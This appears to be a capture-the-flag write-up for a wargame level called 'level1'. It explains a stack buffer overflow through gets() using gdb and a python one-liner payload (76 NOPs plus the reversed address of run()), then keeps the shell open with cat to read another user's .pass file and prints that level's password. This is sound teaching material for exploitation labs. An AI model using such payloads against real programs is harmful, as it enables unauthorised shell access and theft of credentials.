# Level1

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./level1

  $> ./level1
  randomstring
```

> Seems like this program want us to input something during its execution but it does not output anything back.

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). We find that this program is using [`gets()`](https://linux.die.net/man/3/gets) and according to the documentation there is a known bug with it...

> Never use `gets()`. Because it is impossible to tell without knowing the data in advance how many characters `gets()` will read, and because `gets()` will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security.

After some research the obvious path to take is to exploit this fuction to create a [buffer overflow attack](https://en.wikipedia.org/wiki/Buffer_overflow). In order to do this, we must compute the buffer offset using **data section** of our `gdb` analysis stated above, we find that the offset is **76**.

Then we need to construct a call to `run()` using this offset and the function's address.

```shell
  $> (python -c "print '\x90' * 76 + '\x08\x04\x84\x44'[::-1]") | ./level1
  Good... Wait what?
  Segmentation fault (core dumped)
```

> We append the address of `run()` in reverse (this is what `[::1]` is used for, in python it's a reverse string opperation) to respect [byte order](https://en.wikipedia.org/wiki/Endianness) after a list of **76** [NOP instructions](https://en.wikipedia.org/wiki/NOP_(code)).

Segfault still happens but we know that we are on the right track because we get into a shell but since it is executed via `system()` this time, it returns when the command is finished. Asking to open a shell is not enough to stay in it. We need to use something that does read on standard input indefinitely like [`cat`](https://man7.org/linux/man-pages/man1/cat.1.html).

```shell
  $> (python -c "print '\x90' * 76 + '\x08\x04\x84\x44'[::-1]"; cat) | ./level1
  Good... Wait what?
  cat /home/user/level2/.pass
  53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

So next user credentials pair is `level2:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`.

Check [here](./source.c) for reproduction source-code of this binary.